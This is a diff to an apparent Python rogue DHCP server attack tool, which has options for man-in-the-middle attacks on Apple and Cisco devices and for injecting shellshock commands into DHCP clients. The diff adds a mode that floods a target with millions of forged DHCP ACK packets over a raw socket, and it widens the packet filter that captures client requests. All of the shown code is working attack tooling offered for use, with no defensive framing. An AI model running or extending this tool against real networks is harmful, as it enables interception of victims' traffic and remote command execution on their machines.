@@ -10,11 +10,13 @@ from socket import socket, AF_PACKET, SOCK_RAW, inet_aton
 from base64 import b64encode
 from struct import pack
 from netaddr import IPAddress
-from time import sleep
+from tm import ThreadManager
 
 Base = Base()
 Base.check_user()
 Base.check_platform()
+
+tm = ThreadManager(2)
 
 parser = ArgumentParser(description='DHCP Rogue server')
 
@@ -26,6 +28,7 @@ parser.add_argument('-I', '--target_ip', type=str, help='Set client IP address w
 parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
 parser.add_argument('--apple', action='store_true', help='Apple devices MiTM')
 parser.add_argument('--cisco', action='store_true', help='Cisco devices MiTM')
+parser.add_argument('--new', action='store_true', help='New client or client after DHCP DECLINE')
 parser.add_argument('--not_exit', action='store_true', help='Not exit on success MiTM attack')
 
 parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
@@ -70,6 +73,8 @@ current_network_interface = None
 target_mac_address = None
 target_ip_address = None
 offer_ip_address = None
+requested_ip_address = None
+transaction_id_global = None
 dhcp_server_mac_address = None
 dhcp_server_ip_address = None
 router_ip_address = None
@@ -225,10 +230,21 @@ def make_dhcp_nak_packet(transaction_id, requested_ip):
                                 dhcp_server_id=dhcp_server_ip_address)
 
 
+def ack_sender():
+    SOCK = socket(AF_PACKET, SOCK_RAW)
+    SOCK.bind((current_network_interface, 0))
+    ack_packet = make_dhcp_ack_packet(transaction_id_global, requested_ip_address)
+    for _ in range(10000000):
+        SOCK.send(ack_packet)
+    SOCK.close()
+
+
 def dhcp_reply(request):
     global offer_ip_address
     global target_mac_address
     global target_ip_address
+    global requested_ip_address
+    global transaction_id_global
     global number_of_dhcp_request
     global shellshock_url
     global domain
@@ -238,6 +254,7 @@ def dhcp_reply(request):
     global arp_req_your_ip
     global possible_output
     global router_ip_address
+    global tm
 
     SOCK = socket(AF_PACKET, SOCK_RAW)
     SOCK.bind((current_network_interface, 0))
@@ -265,9 +282,23 @@ def dhcp_reply(request):
             print Base.c_info + "DHCP DISCOVER from: " + target_mac_address + " transaction id: " + \
                 hex(transaction_id) + " offer ip: " + offer_ip_address
 
-            offer_packet = make_dhcp_offer_packet(transaction_id)
-            SOCK.send(offer_packet)
-            print Base.c_info + "Send offer response!"
+            if args.new:
+                if target_ip_address is not None:
+                    requested_ip = target_ip_address
+                else:
+                    requested_ip = offer_ip_address
+                    for option in request[DHCP].options:
+                        if option[0] == "requested_addr":
+                            requested_ip = str(option[1])
+
+                transaction_id_global = transaction_id
+                requested_ip_address = requested_ip
+
+                tm.add_task(ack_sender)
+            else:
+                offer_packet = make_dhcp_offer_packet(transaction_id)
+                SOCK.send(offer_packet)
+                print Base.c_info + "Send offer response!"
 
         if request[DHCP].options[0][1] == 8:
             ciaddr = request[BOOTP].ciaddr
@@ -449,9 +480,8 @@ if __name__ == "__main__":
     else:
         if args.target_mac is None:
             print Base.c_info + "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM"
-            sniff(lfilter=lambda d: d.src != eth.get_mac_for_dhcp_discover() and
-                                    d.src != Base.get_netiface_mac_address(current_network_interface),
-                  filter="udp and src port 68 and dst port 67 and dst host 255.255.255.255",
+            sniff(lfilter=lambda d: d.src != eth.get_mac_for_dhcp_discover(),
+                  filter="udp and src port 68 and dst port 67",
                   prn=dhcp_reply, iface=current_network_interface)
         else:
             print Base.c_info + "Waiting for a DHCP DISCOVER, DHCP REQUEST or DHCP INFORM from " + args.target_mac
